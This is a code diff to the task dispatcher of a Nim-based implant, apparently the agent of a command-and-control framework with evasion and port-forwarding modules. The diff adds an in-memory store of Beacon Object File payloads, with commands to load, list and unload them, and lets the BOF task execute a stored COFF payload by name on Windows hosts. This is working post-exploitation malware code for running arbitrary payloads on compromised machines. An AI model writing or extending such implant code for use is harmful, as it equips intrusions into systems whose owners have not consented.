@@ -1,6 +1,8 @@
 ## Command dispatcher for Nim agent — Windows + Linux.
-import std/[os, osproc, strutils, strformat, json, random, base64, sequtils, times]
+import std/[os, osproc, strutils, strformat, json, random, base64, sequtils, times, tables]
 import config, transport, evasion, portfwd
+
+var gBofStore = initTable[string, seq[byte]]()
 
 when defined(windows):
   import winim/lean, winim/inc/tlhelp32
@@ -2425,12 +2427,17 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
   of "BOF":
     when defined(windows):
       try:
-        if payload.len == 0:
+        var coffBytes = payload
+        if coffBytes.len == 0:
+          let nameParts = args.strip().splitWhitespace()
+          if nameParts.len > 0 and gBofStore.hasKey(nameParts[0]):
+            coffBytes = gBofStore[nameParts[0]]
+        if coffBytes.len == 0:
           t.sendResult(id, "", "BOF: missing COFF payload"); return
         let argBytes: seq[byte] =
-          if args.len > 0: cast[seq[byte]](base64.decode(args))
+          if args.len > 0: (try: cast[seq[byte]](base64.decode(args)) except: @[])
           else: @[]
-        let output = bofExec(payload, argBytes)
+        let output = bofExec(coffBytes, argBytes)
         t.sendResult(id, output, "")
       except: t.sendResult(id, "", "BOF: " & getCurrentExceptionMsg())
     else:
@@ -2587,8 +2594,32 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     else:
       t.sendResult(id, portfwdDel(proto, lport), "")
 
-  of "BOF_STORE_LOAD", "BOF_STORE_LIST", "BOF_STORE_UNLOAD":
-    t.sendResult(id, "(bof store not supported in Nim agent — use BOF with payload)", "")
+  of "BOF_STORE_LOAD":
+    let name = args.strip()
+    if name == "":
+      t.sendResult(id, "", "usage: BOF_STORE_LOAD <name>  (payload = base64 COFF)")
+    elif payload.len == 0:
+      t.sendResult(id, "", "BOF_STORE_LOAD: empty payload")
+    else:
+      gBofStore[name] = payload
+      t.sendResult(id, "[+] BOF '" & name & "' loaded into store (" & $payload.len & " bytes)", "")
+
+  of "BOF_STORE_LIST":
+    if gBofStore.len == 0:
+      t.sendResult(id, "(bof store empty)", "")
+    else:
+      var lines: seq[string]
+      for k, v in gBofStore:
+        lines.add("  " & k.alignLeft(30) & "  " & $v.len & " bytes")
+      t.sendResult(id, lines.join("\n"), "")
+
+  of "BOF_STORE_UNLOAD":
+    let name = args.strip()
+    if gBofStore.hasKey(name):
+      gBofStore.del(name)
+      t.sendResult(id, "[+] BOF '" & name & "' removed from store", "")
+    else:
+      t.sendResult(id, "[-] BOF '" & name & "' not in store", "")
 
   of "GEN_LNK":
     when defined(windows):
